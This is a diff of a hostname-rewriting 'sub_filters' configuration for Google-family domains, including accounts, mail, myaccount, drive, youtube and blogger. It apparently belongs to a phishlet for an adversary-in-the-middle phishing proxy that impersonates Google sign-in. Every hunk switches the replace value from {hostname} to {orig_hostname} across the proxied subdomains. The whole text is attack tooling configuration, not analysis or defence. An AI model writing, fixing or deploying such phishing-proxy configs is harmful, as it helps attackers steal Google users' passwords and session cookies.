@@ -155,7 +155,7 @@ sub_filters:
       orig_sub: "accounts",
       domain: "google.com",
       search: "https://{hostname}",
-      replace: "https://{hostname}",
+      replace: "https://{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -172,7 +172,7 @@ sub_filters:
       orig_sub: "accounts",
       domain: "google.com",
       search: "https%3A%2F%2{hostname}/",
-      replace: "https%3A%2F%2{hostname}/",
+      replace: "https%3A%2F%2{orig_hostname}/",
       mimes:
         [
           "text/html",
@@ -189,7 +189,7 @@ sub_filters:
       orig_sub: "accounts",
       domain: "google.com",
       search: "{hostname}",
-      replace: "{hostname}",
+      replace: "{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -207,7 +207,7 @@ sub_filters:
       orig_sub: "www",
       domain: "google.com",
       search: "https://{hostname}",
-      replace: "https://{hostname}",
+      replace: "https://{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -224,7 +224,7 @@ sub_filters:
       orig_sub: "www",
       domain: "google.com",
       search: "https%3A%2F%2{hostname}/",
-      replace: "https%3A%2F%2{hostname}/",
+      replace: "https%3A%2F%2{orig_hostname}/",
       mimes:
         [
           "text/html",
@@ -241,7 +241,7 @@ sub_filters:
       orig_sub: "www",
       domain: "google.com",
       search: "{hostname}",
-      replace: "{hostname}",
+      replace: "{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -259,7 +259,7 @@ sub_filters:
       orig_sub: "mail",
       domain: "google.com",
       search: "https://{hostname}",
-      replace: "https://{hostname}",
+      replace: "https://{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -276,7 +276,7 @@ sub_filters:
       orig_sub: "mail",
       domain: "google.com",
       search: "https%3A%2F%2{hostname}/",
-      replace: "https%3A%2F%2{hostname}/",
+      replace: "https%3A%2F%2{orig_hostname}/",
       mimes:
         [
           "text/html",
@@ -293,7 +293,7 @@ sub_filters:
       orig_sub: "mail",
       domain: "google.com",
       search: "{hostname}",
-      replace: "{hostname}",
+      replace: "{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -311,7 +311,7 @@ sub_filters:
       orig_sub: "myaccount",
       domain: "google.com",
       search: "https://{hostname}",
-      replace: "https://{hostname}",
+      replace: "https://{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -328,7 +328,7 @@ sub_filters:
       orig_sub: "myaccount",
       domain: "google.com",
       search: "https%3A%2F%2{hostname}/",
-      replace: "https%3A%2F%2{hostname}/",
+      replace: "https%3A%2F%2{orig_hostname}/",
       mimes:
         [
           "text/html",
@@ -345,7 +345,7 @@ sub_filters:
       orig_sub: "myaccount",
       domain: "google.com",
       search: "{hostname}",
-      replace: "{hostname}",
+      replace: "{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -363,7 +363,7 @@ sub_filters:
       orig_sub: "drive",
       domain: "google.com",
       search: "https://{hostname}",
-      replace: "https://{hostname}",
+      replace: "https://{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -380,7 +380,7 @@ sub_filters:
       orig_sub: "drive",
       domain: "google.com",
       search: "https%3A%2F%2{hostname}/",
-      replace: "https%3A%2F%2{hostname}/",
+      replace: "https%3A%2F%2{orig_hostname}/",
       mimes:
         [
           "text/html",
@@ -397,7 +397,7 @@ sub_filters:
       orig_sub: "drive",
       domain: "google.com",
       search: "{hostname}",
-      replace: "{hostname}",
+      replace: "{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -415,7 +415,7 @@ sub_filters:
       orig_sub: "play",
       domain: "google.com",
       search: "https://{hostname}",
-      replace: "https://{hostname}",
+      replace: "https://{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -432,7 +432,7 @@ sub_filters:
       orig_sub: "play",
       domain: "google.com",
       search: "https%3A%2F%2{hostname}/",
-      replace: "https%3A%2F%2{hostname}/",
+      replace: "https%3A%2F%2{orig_hostname}/",
       mimes:
         [
           "text/html",
@@ -449,7 +449,7 @@ sub_filters:
       orig_sub: "play",
       domain: "google.com",
       search: "{hostname}",
-      replace: "{hostname}",
+      replace: "{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -467,7 +467,7 @@ sub_filters:
       orig_sub: "ogs",
       domain: "google.com",
       search: "https://{hostname}",
-      replace: "https://{hostname}",
+      replace: "https://{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -484,7 +484,7 @@ sub_filters:
       orig_sub: "ogs",
       domain: "google.com",
       search: "https%3A%2F%2{hostname}/",
-      replace: "https%3A%2F%2{hostname}/",
+      replace: "https%3A%2F%2{orig_hostname}/",
       mimes:
         [
           "text/html",
@@ -501,7 +501,7 @@ sub_filters:
       orig_sub: "ogs",
       domain: "google.com",
       search: "{hostname}",
-      replace: "{hostname}",
+      replace: "{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -519,7 +519,7 @@ sub_filters:
       orig_sub: "notifications",
       domain: "google.com",
       search: "https://{hostname}",
-      replace: "https://{hostname}",
+      replace: "https://{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -536,7 +536,7 @@ sub_filters:
       orig_sub: "notifications",
       domain: "google.com",
       search: "https%3A%2F%2{hostname}/",
-      replace: "https%3A%2F%2{hostname}/",
+      replace: "https%3A%2F%2{orig_hostname}/",
       mimes:
         [
           "text/html",
@@ -553,7 +553,7 @@ sub_filters:
       orig_sub: "notifications",
       domain: "google.com",
       search: "{hostname}",
-      replace: "{hostname}",
+      replace: "{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -571,7 +571,7 @@ sub_filters:
       orig_sub: "apis",
       domain: "google.com",
       search: "https://{hostname}",
-      replace: "https://{hostname}",
+      replace: "https://{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -588,7 +588,7 @@ sub_filters:
       orig_sub: "apis",
       domain: "google.com",
       search: "https%3A%2F%2{hostname}/",
-      replace: "https%3A%2F%2{hostname}/",
+      replace: "https%3A%2F%2{orig_hostname}/",
       mimes:
         [
           "text/html",
@@ -605,7 +605,7 @@ sub_filters:
       orig_sub: "apis",
       domain: "google.com",
       search: "{hostname}",
-      replace: "{hostname}",
+      replace: "{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -623,7 +623,7 @@ sub_filters:
       orig_sub: "www",
       domain: "gstatic.com",
       search: "https://{hostname}",
-      replace: "https://{hostname}",
+      replace: "https://{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -640,7 +640,7 @@ sub_filters:
       orig_sub: "www",
       domain: "gstatic.com",
       search: "https%3A%2F%2{hostname}/",
-      replace: "https%3A%2F%2{hostname}/",
+      replace: "https%3A%2F%2{orig_hostname}/",
       mimes:
         [
           "text/html",
@@ -657,7 +657,7 @@ sub_filters:
       orig_sub: "www",
       domain: "gstatic.com",
       search: "{hostname}",
-      replace: "{hostname}",
+      replace: "{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -675,7 +675,7 @@ sub_filters:
       orig_sub: "fonts",
       domain: "gstatic.com",
       search: "https://{hostname}",
-      replace: "https://{hostname}",
+      replace: "https://{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -692,7 +692,7 @@ sub_filters:
       orig_sub: "fonts",
       domain: "gstatic.com",
       search: "https%3A%2F%2{hostname}/",
-      replace: "https%3A%2F%2{hostname}/",
+      replace: "https%3A%2F%2{orig_hostname}/",
       mimes:
         [
           "text/html",
@@ -709,7 +709,7 @@ sub_filters:
       orig_sub: "fonts",
       domain: "gstatic.com",
       search: "{hostname}",
-      replace: "{hostname}",
+      replace: "{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -727,7 +727,7 @@ sub_filters:
       orig_sub: "content",
       domain: "googleapis.com",
       search: "https://{hostname}",
-      replace: "https://{hostname}",
+      replace: "https://{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -744,7 +744,7 @@ sub_filters:
       orig_sub: "content",
       domain: "googleapis.com",
       search: "https%3A%2F%2{hostname}/",
-      replace: "https%3A%2F%2{hostname}/",
+      replace: "https%3A%2F%2{orig_hostname}/",
       mimes:
         [
           "text/html",
@@ -761,7 +761,7 @@ sub_filters:
       orig_sub: "content",
       domain: "googleapis.com",
       search: "{hostname}",
-      replace: "{hostname}",
+      replace: "{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -779,7 +779,7 @@ sub_filters:
       orig_sub: "fonts",
       domain: "googleapis.com",
       search: "https://{hostname}",
-      replace: "https://{hostname}",
+      replace: "https://{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -796,7 +796,7 @@ sub_filters:
       orig_sub: "fonts",
       domain: "googleapis.com",
       search: "https%3A%2F%2{hostname}/",
-      replace: "https%3A%2F%2{hostname}/",
+      replace: "https%3A%2F%2{orig_hostname}/",
       mimes:
         [
           "text/html",
@@ -813,7 +813,7 @@ sub_filters:
       orig_sub: "fonts",
       domain: "googleapis.com",
       search: "{hostname}",
-      replace: "{hostname}",
+      replace: "{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -831,7 +831,7 @@ sub_filters:
       orig_sub: "ssl",
       domain: "google-analytics.com",
       search: "https://{hostname}",
-      replace: "https://{hostname}",
+      replace: "https://{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -848,7 +848,7 @@ sub_filters:
       orig_sub: "ssl",
       domain: "google-analytics.com",
       search: "https%3A%2F%2{hostname}/",
-      replace: "https%3A%2F%2{hostname}/",
+      replace: "https%3A%2F%2{orig_hostname}/",
       mimes:
         [
           "text/html",
@@ -865,7 +865,7 @@ sub_filters:
       orig_sub: "ssl",
       domain: "google-analytics.com",
       search: "{hostname}",
-      replace: "{hostname}",
+      replace: "{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -883,7 +883,7 @@ sub_filters:
       orig_sub: "www",
       domain: "google-analytics.com",
       search: "https://{hostname}",
-      replace: "https://{hostname}",
+      replace: "https://{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -900,7 +900,7 @@ sub_filters:
       orig_sub: "www",
       domain: "google-analytics.com",
       search: "https%3A%2F%2{hostname}/",
-      replace: "https%3A%2F%2{hostname}/",
+      replace: "https%3A%2F%2{orig_hostname}/",
       mimes:
         [
           "text/html",
@@ -917,7 +917,7 @@ sub_filters:
       orig_sub: "www",
       domain: "google-analytics.com",
       search: "{hostname}",
-      replace: "{hostname}",
+      replace: "{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -935,7 +935,7 @@ sub_filters:
       orig_sub: "www",
       domain: "blogger.com",
       search: "https://{hostname}",
-      replace: "https://{hostname}",
+      replace: "https://{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -952,7 +952,7 @@ sub_filters:
       orig_sub: "www",
       domain: "blogger.com",
       search: "https%3A%2F%2{hostname}/",
-      replace: "https%3A%2F%2{hostname}/",
+      replace: "https%3A%2F%2{orig_hostname}/",
       mimes:
         [
           "text/html",
@@ -969,7 +969,7 @@ sub_filters:
       orig_sub: "www",
       domain: "blogger.com",
       search: "{hostname}",
-      replace: "{hostname}",
+      replace: "{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -987,7 +987,7 @@ sub_filters:
       orig_sub: "accounts",
       domain: "blogger.com",
       search: "https://{hostname}",
-      replace: "https://{hostname}",
+      replace: "https://{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -1004,7 +1004,7 @@ sub_filters:
       orig_sub: "accounts",
       domain: "blogger.com",
       search: "https%3A%2F%2{hostname}/",
-      replace: "https%3A%2F%2{hostname}/",
+      replace: "https%3A%2F%2{orig_hostname}/",
       mimes:
         [
           "text/html",
@@ -1021,7 +1021,7 @@ sub_filters:
       orig_sub: "accounts",
       domain: "blogger.com",
       search: "{hostname}",
-      replace: "{hostname}",
+      replace: "{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -1039,7 +1039,7 @@ sub_filters:
       orig_sub: "accounts",
       domain: "youtube.com",
       search: "https://{hostname}",
-      replace: "https://{hostname}",
+      replace: "https://{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -1056,7 +1056,7 @@ sub_filters:
       orig_sub: "accounts",
       domain: "youtube.com",
       search: "https%3A%2F%2{hostname}/",
-      replace: "https%3A%2F%2{hostname}/",
+      replace: "https%3A%2F%2{orig_hostname}/",
       mimes:
         [
           "text/html",
@@ -1073,7 +1073,7 @@ sub_filters:
       orig_sub: "accounts",
       domain: "youtube.com",
       search: "{hostname}",
-      replace: "{hostname}",
+      replace: "{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -1091,7 +1091,7 @@ sub_filters:
       orig_sub: "lh3",
       domain: "googleusercontent.com",
       search: "https://{hostname}",
-      replace: "https://{hostname}",
+      replace: "https://{orig_hostname}",
       mimes:
         [
           "text/html",
@@ -1108,7 +1108,7 @@ sub_filters:
       orig_sub: "lh3",
       domain: "googleusercontent.com",
       search: "https%3A%2F%2{hostname}/",
-      replace: "https%3A%2F%2{hostname}/",
+      replace: "https%3A%2F%2{orig_hostname}/",
       mimes:
         [
           "text/html",
@@ -1125,7 +1125,7 @@ sub_filters:
       orig_sub: "lh3",
       domain: "googleusercontent.com",
       search: "{hostname}",
-      replace: "{hostname}",
+      replace: "{orig_hostname}",
       mimes:
         [
           "text/html",
